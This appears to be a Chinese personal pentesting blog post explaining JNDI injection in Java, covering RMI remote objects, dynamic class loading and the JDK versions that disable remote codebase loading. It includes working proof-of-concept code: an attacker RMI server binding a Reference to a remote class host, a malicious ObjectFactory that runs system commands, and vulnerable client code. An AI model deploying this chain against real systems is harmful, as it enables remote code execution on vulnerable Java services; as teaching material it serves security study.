---
draft: false
isCJKLanguage: true
date: 2022-03-30
lastmod: 2022-03-30
title: "JNDI 注入"
description: 我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。
categories: 
  - Pentest
tags:
  - jdni
  - 反序列化
---


### 0x00 JDNI
JNDI(Java Naming and Directory Interface) 是 Java 提供的 Java 命名和目录接口

JNDI 可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、CORBA

JNDI 可对 LDAP、RMI 等服务进行封装，从而提供统一的客户端 API

![80](/img/post/Xnip2022-05-30_10-13-30.jpg)

### 0x01 调用 RMI 远程对象
RMI Server 端监听两个端口，一个是 rmi 端口1099，一个是随机的通信端口；

Client 端调用 Server 远程对象需要先获取 Stub；

Client 可以通过监听 1099 的 rmi 上的 RMIRegistry 这个远程对象来获取 Stub；

之后 Client 通过 Stub 连接到 Server 端监听的通信端口并提交参数；

远程 Server 端上执行具体的方法，并返回结果给 Stub，Stub 返回执行结果给 Client 端；

从 Client 看来就好像是 Stub 在本地执行了这个方法一样；

![70](/img/post/Xnip2022-05-30_10-15-16.jpg)

RMI 服务端启动远程对象 Registry
```java
IHello rhello = new HelloImpl();
LocateRegistry.createRegistry(1099);
Naming.bind("rmi://0.0.0.0:1099/hello", rhello);
```

客户端获取 RMI 服务端的远程对象 rhello
```java
Registry registry = LocateRegistry.getRegistry("192.168.1.110", 1099);
IHello rhello = (IHello) registry.lookup("hello");
rhello.sayHello("test");
```

### 0x02 动态加载类
RMI 核心特点之一就是动态类加载，如果当前 JVM 中没有某个类的定义，它可以通过 URL 从远程 web 服务去下载这个类的 class 文件

客户端同样需要有运行时动态加载额外类的能力，客户端使用了与 RMI 注册表相同的机制，RMI 服务端将 URL 传递给客户端，客户端通过 HTTP 请求下载这些类

### 0x03 JNDI 注入
JNDI 注入其实是把目标主机，即使用 JNDI 服务的主机当作了 Client，它请求了恶意的 RMI

JNDI 接口在初始化时，可以将 RMI URI 作为参数传入，而 JNDI 注入就出现在客户端的 lookup() 函数中，如果<f>lookup() 的参数可控</f>就可能被攻击。

```java
public static void main(String[] args) {
    try {
        String uri = "rmi://192.168.1.110:1099/rhello";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

在 JNDI 服务中，RMI 服务端除了直接绑定远程对象之外，还可以通过 References 类来绑定一个外部的远程对象。绑定了 Reference 之后，服务端会先通过 Referenceable.getReference() 获取绑定对象的引用，并且在目录中保存。当客户端(JNDI 服务)在 lookup() 查找这个远程对象时就会获取相应的 object factory，最终通过 factory 类将 reference 转换为具体的对象实例。

JNDI 注入流程：

* 目标代码中调用了 InitialContext.lookup(URI)，且URI为用户可控；
* 攻击者控制 URI 参数为 RMI 服务地址，如：rmi://hacker_rmi_server/name；
* 攻击者 RMI 服务器绑定一个 web 服务中的 Reference 对象，Reference 对象中指定某个恶意的 Factory 类，而 Factory 类文件的构造方法、静态代码块、getObjectInstance() 方法等处可写入恶意代码；
* 客户端在进行 lookup() 操作时，会动态加载并实例化恶意 Factory 类，并调用 factory.getObjectInstance() 获取外部远程对象实例，从而 RCE；

### 0x04 JDNI 注入例子
攻击者代码

```java
public static void main(String[] args) throws Exception {
    try {
        Registry registry = LocateRegistry.createRegistry(1099);
        
        // http://123.123.123.123:8081/ 为放字节码文件的 web 服务器
        Reference aa = new Reference("Calc", "Calc", "http://123.123.123.123:8081/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);
        
        registry.bind("hello", refObjWrapper);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

恶意对象，保存为 java 文件，用 javac 编译成 .class 字节码文件，上传到 web 服务器

```java
import java.lang.Runtime;
import java.lang.Process;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
​
public class Calc implements ObjectFactory {
    {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/Calc2"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
​
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/Calc1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
​
    public Calc() {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/Calc3"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
​
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/Calc4"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
        return null;
    }
}
```

被攻击者代码

```java
public static void main(String[] args) {
    try {
        String uri = "rmi://123.123.123.123:1099/hello";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

### 0x05 jdk 版本问题
在 jdk8u121 7u131 6u141 版本开始默认 com.sun.jndi.rmi.object.trustURLCodebase 设置为 false，rmi 加载远程的字节码不会执行成功

在 jdk11.0.1 8u191 7u201 6u211 版本开始默认 com.sun.jndi.ldap.object.trustURLCodebase 设置为 false，ldap 加载远程的字节码不会执行成功。

在 jdk8u191 之后 RMI 和 LDAP 默认都不能从远程加载类，但还是可以在 RMI 和 LDAP 中获取对象



#### Reference(侵删)：
* [https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw](https://mp.weixin.qq.com/s/cyeEAv31GO_hZCTXVRBkxw?_blank)
* [https://mp.weixin.qq.com/s/GJ9Dio_7A8RCeipilIHXEg](https://mp.weixin.qq.com/s/GJ9Dio_7A8RCeipilIHXEg?_blank)
